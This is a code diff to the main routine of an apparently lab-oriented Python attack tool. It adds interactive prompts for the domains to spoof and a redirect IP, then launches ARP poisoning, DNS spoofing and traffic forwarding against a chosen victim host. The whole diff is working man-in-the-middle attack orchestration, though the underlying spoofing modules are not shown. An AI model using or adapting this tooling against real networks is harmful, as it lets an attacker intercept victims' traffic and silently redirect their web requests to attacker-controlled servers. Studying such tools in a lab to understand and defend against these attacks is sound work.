@@ -133,7 +133,32 @@ if __name__ == '__main__':
         else:
             print("The name you gave does not match any of the chosen IP addresses")
 
-    print("Ready to start ARP spoofing, press [ENTER] to start.")
+    print("Please type the domain names you want to spoof for the victim, "
+          "type 'done' once all domain names have been input.")
+    spoofed_domain_names = list()
+    while True:
+        user_input = input("Domain name that will be spoofed:\n")
+        if user_input in spoofed_domain_names:
+            print("This domain name is already in the list of domains that will be spoofed.")
+        elif user_input == "done":
+            break
+        else:
+            spoofed_domain_names.append(user_input)
+            print(f"domain names that will be spoofed: {spoofed_domain_names}")
+
+    while True:
+        print("Please type the IP to which the spoofed domain names should be redirected:")
+        user_input = input()
+        redirect_ip = user_input
+        print(f"Are you sure you want to redirect the spoofed host to {redirect_ip}?")
+        user_input = input("[y/n]")
+
+        if user_input == "y":
+            break
+        else:
+            pass
+
+    input("Setup ready, press [ENTER] to start ARP and DNS spoofing.")
     arp_spoofing = arp.ARPSpoofing(
         interface=arp_spoof_victim_if,
         target_mac=arp_spoof_victim_mac,
@@ -142,21 +167,22 @@ if __name__ == '__main__':
         hosts=hosts,
         delay=3
     )
-    arp_spoofing.start()
-    forwarding = fwd.Forwarding(interface=arp_spoof_victim_if, hosts=hosts)
-    forwarding.start()
-
-    input("Press [enter] to start DNS spoofing")
     dns_spoofing = dns.DNSSpoofing(
         interface=arp_spoof_victim_if,
-        domain_names=["www.thisisadomainname.com"],
+        domain_names=spoofed_domain_names,
         victims=[arp_spoof_victim_ip],
-        redirect_ip="192.168.56.102"
+        redirect_ip=redirect_ip
     )
+    forwarding = fwd.Forwarding(
+        interface=arp_spoof_victim_if,
+        hosts=hosts,
+        domain_names=spoofed_domain_names
+    )
+    arp_spoofing.start()
     dns_spoofing.start()
-    input("Press [enter] to stop DNS spoofing")
-    dns_spoofing.stop()
+    forwarding.start()
 
-    input("Press [enter] to stop ARP spoofing")
+    input("Press [enter] to stop DNS and ARP spoofing")
+    dns_spoofing.stop()
     arp_spoofing.stop()
     forwarding.stop()
